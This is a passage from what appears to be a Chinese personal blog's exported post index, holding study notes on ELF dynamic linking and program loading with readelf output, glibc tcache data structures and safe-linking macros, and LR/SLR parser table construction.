<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">此段含有装载时所需要的数据结构</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Dynamic section at offset <span class="number">0x2db8</span> contains <span class="number">28</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x0000000000000001</span> (NEEDED)             Shared library: [./Lib.so]</span><br><span class="line"> <span class="number">0x0000000000000001</span> (NEEDED)             Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x000000000000000c</span> (INIT)               <span class="number">0x1000</span></span><br><span class="line"> <span class="number">0x000000000000000d</span> (FINI)               <span class="number">0x1164</span></span><br><span class="line"> <span class="number">0x0000000000000019</span> (INIT_ARRAY)         <span class="number">0x3da8</span></span><br><span class="line"> <span class="number">0x000000000000001b</span> (INIT_ARRAYSZ)       <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x000000000000001a</span> (FINI_ARRAY)         <span class="number">0x3db0</span></span><br><span class="line"> <span class="number">0x000000000000001c</span> (FINI_ARRAYSZ)       <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x000000006ffffef5</span> (GNU_HASH)           <span class="number">0x3b0</span></span><br><span class="line"> <span class="number">0x0000000000000005</span> (STRTAB)             <span class="number">0x480</span></span><br><span class="line"> <span class="number">0x0000000000000006</span> (SYMTAB)             <span class="number">0x3d8</span></span><br><span class="line"> <span class="number">0x000000000000000a</span> (STRSZ)              <span class="number">152</span> (bytes)</span><br><span class="line"> <span class="number">0x000000000000000b</span> (SYMENT)             <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000000000015</span> (DEBUG)              <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000000003</span> (PLTGOT)             <span class="number">0x3fb8</span></span><br><span class="line"> <span class="number">0x0000000000000002</span> (PLTRELSZ)           <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000000000014</span> (PLTREL)             RELA</span><br><span class="line"> <span class="number">0x0000000000000017</span> (JMPREL)             <span class="number">0x618</span></span><br><span class="line"> <span class="number">0x0000000000000007</span> (RELA)               <span class="number">0x558</span></span><br><span class="line"> <span class="number">0x0000000000000008</span> (RELASZ)             <span class="number">192</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000000000009</span> (RELAENT)            <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x000000000000001e</span> (FLAGS)              BIND_NOW</span><br><span class="line"> <span class="number">0x000000006ffffffb</span> (FLAGS_1)            Flags: NOW PIE</span><br><span class="line"> <span class="number">0x000000006ffffffe</span> (VERNEED)            <span class="number">0x528</span></span><br><span class="line"> <span class="number">0x000000006fffffff</span> (VERNEEDNUM)         <span class="number">1</span></span><br><span class="line"> <span class="number">0x000000006ffffff0</span> (VERSYM)             <span class="number">0x518</span></span><br><span class="line"> <span class="number">0x000000006ffffff9</span> (RELACOUNT)          <span class="number">3</span></span><br><span class="line"> <span class="number">0x0000000000000000</span> (<span class="literal">NULL</span>)               <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>这一部分还涉及到global symbol interpose的问题，就是符号冲突的话，那么第二个加载的符号会被忽略，这也解答了之前非常奇怪的问题，就是为什么模块内函数也要重定位到got表，这就是为了防止外部符号覆盖。</p>
<h2 id="第三步：重定位和初始化"><a href="#第三步：重定位和初始化" class="headerlink" title="第三步：重定位和初始化"></a>第三步：重定位和初始化</h2><p>就是通过重定位段来进行got和got.plt表的装载。重定位之后，若库中有.ini段，那么会执行其中代码，来进行全局对象的构造和初始化，退出时也会执行.fini中的代码，尽心全局对象的销毁操作。在这之后就可以把控制权交给程序入口了。</p>
]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>关于tcache的一些基础概述</title>
    <url>/2024/08/10/%E5%85%B3%E4%BA%8Etcache%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8E%A2%E7%B4%A2/</url>
    <content><![CDATA[<h1 id="tcache相关结构体"><a href="#tcache相关结构体" class="headerlink" title="tcache相关结构体"></a>tcache相关结构体</h1><h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];<span class="comment">//数量统计</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//指针数组</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p>此结构体为每个线程一个的tcache的管理器，管理级别上类似于arena。详情看源码，此结构体会在调用malloc的时候初始化。初始值全0。</p>
<h2 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>此结构体为tcache的chunk，和一般的chunk比不会记录size字段，也许是不安全的隐患。但是会记录key字段，类似于canary（猜的）。entries数组记录了链表中最后一个chunk的地址，也就是说entries就是所谓的bin。</p>
<h1 id="关于PROTECT-PTR-pos-ptr-和REVEAL-PTR-ptr-宏定义"><a href="#关于PROTECT-PTR-pos-ptr-和REVEAL-PTR-ptr-宏定义" class="headerlink" title="关于PROTECT_PTR(pos, ptr)和REVEAL_PTR(ptr)宏定义"></a>关于PROTECT_PTR(pos, ptr)和REVEAL_PTR(ptr)宏定义</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>此宏定义会对bin链表中的指针进行混淆操作，具体方式就是低版本的指针的值与指针存储的位置&gt;&gt;12进行异或操作。若要恢复，就用结果值亦或指针存储的位置&gt;&gt;12即可，可得到正常的值。# tcache相关结构体</p>
<h1 id="tcache相关操作"><a href="#tcache相关操作" class="headerlink" title="tcache相关操作"></a>tcache相关操作</h1><blockquote>
<p>主要涉及到tcache_put和tcache_get，逻辑比较简单，不细说了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>heap利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>关于parser的语法树生成算法（实现）</title>
    <url>/2024/08/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86paser%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Week-5-and-Week-6"><a href="#Week-5-and-Week-6" class="headerlink" title="Week 5 and Week 6"></a>Week 5 and Week 6</h2><blockquote>
<p>首先是提出算法实现前的一些铺垫，主要包括以下知识：</p>
<p>1.Top-Down and Bottom-Up</p>
<p>2.Shift-Reduce Parsing</p>
<p>3.一些notation为了算法实现做铺垫</p>
</blockquote>
<h3 id="1-Top-Down-and-Bottom-Up"><a href="#1-Top-Down-and-Bottom-Up" class="headerlink" title="1.Top-Down and Bottom-Up"></a>1.Top-Down and Bottom-Up</h3><p>Top-Down对应先前讲的leftmost，而Bottom-Up则对应先前讲的rightmost，Week 4是从易于理解的角度讲解，而本周则是从实现的角度讲解。主要涉及到了如何shift，如何reduce，以及如何生成树，但是没有讲什么时候。</p>
<h3 id="2-Shift-Reduce-Parsing"><a href="#2-Shift-Reduce-Parsing" class="headerlink" title="2.Shift-Reduce Parsing"></a>2.Shift-Reduce Parsing</h3><p>基于Top-Down and Bottom-Up引出的语法解析实现的简单模型，初步引入了一些notation，如</p>
<p><img src="/img/mypic/com/192717-17226163867168.png" alt="192717"></p>
<p>主要解决了在哪reduce的问题<img src="/img/mypic/com/192952-17226163831407.png" alt="192952"></p>
<p>期间讲了一个插曲，也就是冲突（conflict）的解决方法：</p>
<p>一个为：shift和reduce的冲突，可被precedence and associativity declaration修复，类似于leftmost 或者rightmost，如加法和乘法的优先级。</p>
<p>另一个： reduce-reduce conflict，不知道该选择哪一个规则，说明： There is ambiguity in the grammar ，Might be fixed by additional lookahead，这个类似于两个规则冲突</p>
<h3 id="3-When-to-shift-reduce"><a href="#3-When-to-shift-reduce" class="headerlink" title="3.When to shift&#x2F;reduce?"></a>3.When to shift&#x2F;reduce?</h3><p>接着讲什么时候解决冲突，主要引入了prefix and handle</p>
<p><img src="/img/mypic/com/193651-17226163759036.png" alt="193651-17226163759036"></p>
<p>然后将了语法规范（specific）和parser的关系，核心在这张图：基本观点是，规范越简单解析器越简单，解析器无法准确识别所用的上下文无关语法（CFG），解析器的实现也需要效率和功能的trade-off</p>
<p><img src="/img/mypic/com/193848-17226163733105.png" alt="193848-17226163733105"></p>
<h3 id="3-When-to-shift-reduce-realize"><a href="#3-When-to-shift-reduce-realize" class="headerlink" title="3.When to shift&#x2F;reduce?realize"></a>3.When to shift&#x2F;reduce?realize</h3><h4 id="algorithm-1（LR0）"><a href="#algorithm-1（LR0）" class="headerlink" title="algorithm 1（LR0）"></a>algorithm 1（LR0）</h4><blockquote>
<p>关键在于构造action和goto两张表格</p>
<p>构造上述两张表格需要知道Configuration set</p>
<p>构造configuration set需要知道如何计算Closure property</p>
</blockquote>
<ul>
<li><p>action和goto表格的状态转移可看下表：</p>
<p>只需要注意一点的就是其状态转移只和stack头的元素有关，当弹出元素之后的状态转移也是如此</p>
<p><img src="/img/mypic/com/235730.png" alt="235730"></p>
</li>
<li><p>closure的构造</p>
<p>把所有的非终结符递归的转换即可</p>
<p><img src="/img/mypic/com/000108-17226163667684.png" alt="2024-08-03 000108-17226163667684"></p>
</li>
<li><p>Successor(I, X)的构造</p>
<blockquote>
<p>类似于状态转移后的状态的构造，状态转移需要移动圆点</p>
</blockquote>
<p><img src="/img/mypic/com/image-20240803000246178.png" alt="image-20240803000246178"></p>
</li>
<li><p>configuration set的构造</p>
<p><img src="/img/mypic/com/image-20240803000332150-17226163592833.png" alt="image-20240803000332150"></p>
</li>
<li><p>action和goto的表格获得</p>
<p><img src="/img/mypic/com/image-20240803000701647-17226163557042.png" alt="image-20240803000701647"></p>
</li>
<li><p>需要注意的地方</p>
<blockquote>
<p>1.状态不要重复，状态也不能少</p>
<p>2.若出现冲突说明grammar定义的不好</p>
</blockquote>
<p>如此例子：则出现了reduce和shift冲突和reduce和reduce冲突，注意有的并非冲突，可以一个状态多次操作</p>
<p><img src="/img/mypic/com/image-20240803000826163-17226162670141.png" alt="image-20240803000826163"></p>
<p><img src="/img/mypic/com/image-20240803001104451.png" alt="image-20240803001104451"></p>
</li>
</ul>
<h4 id="algorithm-2（SLR1）"><a href="#algorithm-2（SLR1）" class="headerlink" title="algorithm 2（SLR1）"></a>algorithm 2（SLR1）</h4><blockquote>
<p>关键在于知道first（X）和follow（X）的定义，进而shift操作和reduce操作以及reduce-reduce的conflict都可以从follow（X）的定义解决，当然也有语法不满足的情况。</p>
<p>总结就是通过可以观察即将输入的terminal来判断是否执行push操作，或者直接执行reduce操作，因此称为SLR1，然后再根据执行操作后入栈的元素来实现状态转移，也就是说在入栈的那一刻状态也转移了，栈顶存储的就是此时的state</p>
<p>需注意一次状态一次操作，即state-&gt;action-&gt;new_state(根据action后的栈顶元素决定)</p>
</blockquote>
<ul>
<li><p>例子：在reduce阶段可以认为是（pop+push）然后进入新状态。</p>
<p><img src="/img/mypic/com/image-20240803224138802.png" alt="image-20240803224138802"></p>
</li>
</ul>
<h4 id="algorithm-3（SLR）"><a href="#algorithm-3（SLR）" class="headerlink" title="algorithm 3（SLR）"></a>algorithm 3（SLR）</h4><blockquote>
<p>讲看follow来构造configuration set改为根据看lookahead，更加细粒化，其他没有什么不一样的</p>
</blockquote>
<h3 id="5-优先级precedence"><a href="#5-优先级precedence" class="headerlink" title="5.优先级precedence"></a>5.优先级precedence</h3><blockquote>
<p>不是通过更改语法来实现，而是给算法增加额外规则，也就是人为增加何时reduce or shift，以减少此类冲突情形。</p>
</blockquote>
]]></content>
      <categories>
        <category>cs</category>
        <category>compiler</category>
      </categories>
      <tags>
        <tag>cs</tag>
        <tag>compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>程序装载简析</title>
    <url>/2024/08/16/%E7%A8%8B%E5%BA%8F%E8%A3%85%E8%BD%BD%E7%AE%80%E6%9E%90/</url>
    <content><![CDATA[<p>作为一个高视角的科普吧，动态链接在装载过程中做了非常复杂的操作，还需要深入学习。</p>
<h2 id="关于分段和分页"><a href="#关于分段和分页" class="headerlink" title="关于分段和分页"></a>关于分段和分页</h2><p>核心思想就是虚拟化，如何共用同一块内存，如何实现物理内存的复用，MMU和交换空间的发展使之一步一步成为可能，至于如何进行换页，如何进行映射这是OS该管的事，OS使用MMU提供的接口实现一些列换页算法，如LRU等等，装载器的实现的核心代码也是定义在内核中的，主要分为以下几步：</p>
<p><img src="/img/mypic/load.png" alt="load"></p>
<p>按我的理解就是，根据elf的各个段的大小以及类型等各个字段，来建立虚拟内存和文件系统以及物理内存之间的映射关系（俗称页表）。当然进程管理系统，也应该做事，这里只讨论文件装载。决定装载的映射关系的一个重要的地方就是内部碎片和外部碎片，感觉这两个非常矛盾，需要trade-off。段页式管理，多级页表虽然缓解了外部碎片，但是同样加剧了内部碎片，使本应该不占一个页的段，占据一个页空间。感觉这里面极度需要平衡，至于该如何装载那就是OS的事了。但是装载之前elf也是做了一些工作，可执行文件有一个叫程序头的东西，俗称段表，貌似也可以对装载的过程一窥一二。</p>
<h2 id="program-header"><a href="#program-header" class="headerlink" title="program header"></a>program header</h2><blockquote>
<p>其中描述了各个段的信息，大概就是描述了什么文件偏移该映射到什么地方，但是程序是有pie这个选项的，不知道内核是如何处理的。，可以观察到段表比节表少了好多，段表会将部分节表进行合并导致的。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	p_type;			<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf64_Word	p_flags;		<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf64_Off	p_offset;		<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf64_Addr	p_vaddr;		<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf64_Addr	p_paddr;		<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf64_Xword	p_filesz;		<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf64_Xword	p_memsz;		<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf64_Xword	p_align;		<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .interp           PROGBITS         <span class="number">0000000000000318</span>  <span class="number">00000318</span></span><br><span class="line">       <span class="number">000000000000001</span>c  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .note.gnu.pr[...] NOTE             <span class="number">0000000000000338</span>  <span class="number">00000338</span></span><br><span class="line">       <span class="number">0000000000000030</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">3</span>] .note.gnu.bu[...] NOTE             <span class="number">0000000000000368</span>  <span class="number">00000368</span></span><br><span class="line">       <span class="number">0000000000000024</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .note.ABI-tag     NOTE             <span class="number">000000000000038</span>c  <span class="number">0000038</span>c</span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .gnu.hash         GNU_HASH         <span class="number">00000000000003b</span>0  <span class="number">000003b</span>0</span><br><span class="line">       <span class="number">0000000000000024</span>  <span class="number">0000000000000000</span>   A       <span class="number">6</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">6</span>] .dynsym           DYNSYM           <span class="number">00000000000003</span>d8  <span class="number">000003</span>d8</span><br><span class="line">       <span class="number">00000000000000</span>a8  <span class="number">0000000000000018</span>   A       <span class="number">7</span>     <span class="number">1</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">7</span>] .dynstr           STRTAB           <span class="number">0000000000000480</span>  <span class="number">00000480</span></span><br><span class="line">       <span class="number">000000000000008f</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">8</span>] .gnu.version      VERSYM           <span class="number">0000000000000510</span>  <span class="number">00000510</span></span><br><span class="line">       <span class="number">000000000000000</span>e  <span class="number">0000000000000002</span>   A       <span class="number">6</span>     <span class="number">0</span>     <span class="number">2</span></span><br><span class="line">  [ <span class="number">9</span>] .gnu.version_r    VERNEED          <span class="number">0000000000000520</span>  <span class="number">00000520</span></span><br><span class="line">       <span class="number">0000000000000030</span>  <span class="number">0000000000000000</span>   A       <span class="number">7</span>     <span class="number">1</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">10</span>] .rela.dyn         RELA             <span class="number">0000000000000550</span>  <span class="number">00000550</span></span><br><span class="line">       <span class="number">00000000000000</span>c0  <span class="number">0000000000000018</span>   A       <span class="number">6</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">11</span>] .rela.plt         RELA             <span class="number">0000000000000610</span>  <span class="number">00000610</span></span><br><span class="line">       <span class="number">0000000000000018</span>  <span class="number">0000000000000018</span>  AI       <span class="number">6</span>    <span class="number">24</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">12</span>] .init             PROGBITS         <span class="number">0000000000001000</span>  <span class="number">00001000</span></span><br><span class="line">       <span class="number">000000000000001b</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">13</span>] .plt              PROGBITS         <span class="number">0000000000001020</span>  <span class="number">00001020</span></span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000010</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">14</span>] .plt.got          PROGBITS         <span class="number">0000000000001040</span>  <span class="number">00001040</span></span><br><span class="line">       <span class="number">0000000000000010</span>  <span class="number">0000000000000010</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">15</span>] .plt.sec          PROGBITS         <span class="number">0000000000001050</span>  <span class="number">00001050</span></span><br><span class="line">       <span class="number">0000000000000010</span>  <span class="number">0000000000000010</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">16</span>] .text             PROGBITS         <span class="number">0000000000001060</span>  <span class="number">00001060</span></span><br><span class="line">       <span class="number">0000000000000117</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">17</span>] .fini             PROGBITS         <span class="number">0000000000001178</span>  <span class="number">00001178</span></span><br><span class="line">       <span class="number">000000000000000</span>d  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">18</span>] .rodata           PROGBITS         <span class="number">0000000000002000</span>  <span class="number">00002000</span></span><br><span class="line">       <span class="number">0000000000000007</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">19</span>] .eh_frame_hdr     PROGBITS         <span class="number">0000000000002008</span>  <span class="number">00002008</span></span><br><span class="line">       <span class="number">0000000000000034</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">20</span>] .eh_frame         PROGBITS         <span class="number">0000000000002040</span>  <span class="number">00002040</span></span><br><span class="line">       <span class="number">00000000000000</span>ac  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">21</span>] .init_array       INIT_ARRAY       <span class="number">0000000000003</span>db8  <span class="number">00002</span>db8</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000008</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">22</span>] .fini_array       FINI_ARRAY       <span class="number">0000000000003</span>dc0  <span class="number">00002</span>dc0</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000008</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">23</span>] .dynamic          DYNAMIC          <span class="number">0000000000003</span>dc8  <span class="number">00002</span>dc8</span><br><span class="line">       <span class="number">00000000000001f</span>0  <span class="number">0000000000000010</span>  WA       <span class="number">7</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">24</span>] .got              PROGBITS         <span class="number">0000000000003f</span>b8  <span class="number">00002f</span>b8</span><br><span class="line">       <span class="number">0000000000000048</span>  <span class="number">0000000000000008</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">25</span>] .data             PROGBITS         <span class="number">0000000000004000</span>  <span class="number">00003000</span></span><br><span class="line">       <span class="number">0000000000000010</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">26</span>] .bss              NOBITS           <span class="number">0000000000004010</span>  <span class="number">00003010</span></span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">27</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00003010</span></span><br><span class="line">       <span class="number">000000000000002b</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">28</span>] .symtab           SYMTAB           <span class="number">0000000000000000</span>  <span class="number">00003040</span></span><br><span class="line">       <span class="number">0000000000000360</span>  <span class="number">0000000000000018</span>          <span class="number">29</span>    <span class="number">18</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">29</span>] .strtab           STRTAB           <span class="number">0000000000000000</span>  <span class="number">000033</span>a0</span><br><span class="line">       <span class="number">00000000000001e0</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">30</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">00003580</span></span><br><span class="line">       <span class="number">000000000000011</span>a  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  PHDR           <span class="number">0x0000000000000040</span> <span class="number">0x0000000000000040</span> <span class="number">0x0000000000000040</span></span><br><span class="line">                 <span class="number">0x00000000000002d8</span> <span class="number">0x00000000000002d8</span>  R      <span class="number">0x8</span></span><br><span class="line">  INTERP         <span class="number">0x0000000000000318</span> <span class="number">0x0000000000000318</span> <span class="number">0x0000000000000318</span></span><br><span class="line">                 <span class="number">0x000000000000001c</span> <span class="number">0x000000000000001c</span>  R      <span class="number">0x1</span></span><br><span class="line">      [Requesting program interpreter: /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>]</span><br><span class="line">  LOAD           <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">                 <span class="number">0x0000000000000628</span> <span class="number">0x0000000000000628</span>  R      <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x0000000000001000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000001000</span></span><br><span class="line">                 <span class="number">0x0000000000000185</span> <span class="number">0x0000000000000185</span>  R E    <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x0000000000002000</span> <span class="number">0x0000000000002000</span> <span class="number">0x0000000000002000</span></span><br><span class="line">                 <span class="number">0x00000000000000ec</span> <span class="number">0x00000000000000ec</span>  R      <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x0000000000002db8</span> <span class="number">0x0000000000003db8</span> <span class="number">0x0000000000003db8</span></span><br><span class="line">                 <span class="number">0x0000000000000258</span> <span class="number">0x0000000000000260</span>  RW     <span class="number">0x1000</span></span><br><span class="line">  DYNAMIC        <span class="number">0x0000000000002dc8</span> <span class="number">0x0000000000003dc8</span> <span class="number">0x0000000000003dc8</span></span><br><span class="line">                 <span class="number">0x00000000000001f0</span> <span class="number">0x00000000000001f0</span>  RW     <span class="number">0x8</span></span><br><span class="line">  NOTE           <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span></span><br><span class="line">                 <span class="number">0x0000000000000030</span> <span class="number">0x0000000000000030</span>  R      <span class="number">0x8</span></span><br><span class="line">  NOTE           <span class="number">0x0000000000000368</span> <span class="number">0x0000000000000368</span> <span class="number">0x0000000000000368</span></span><br><span class="line">                 <span class="number">0x0000000000000044</span> <span class="number">0x0000000000000044</span>  R      <span class="number">0x4</span></span><br><span class="line">  GNU_PROPERTY   <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span></span><br><span class="line">                 <span class="number">0x0000000000000030</span> <span class="number">0x0000000000000030</span>  R      <span class="number">0x8</span></span><br><span class="line">  GNU_EH_FRAME   <span class="number">0x0000000000002008</span> <span 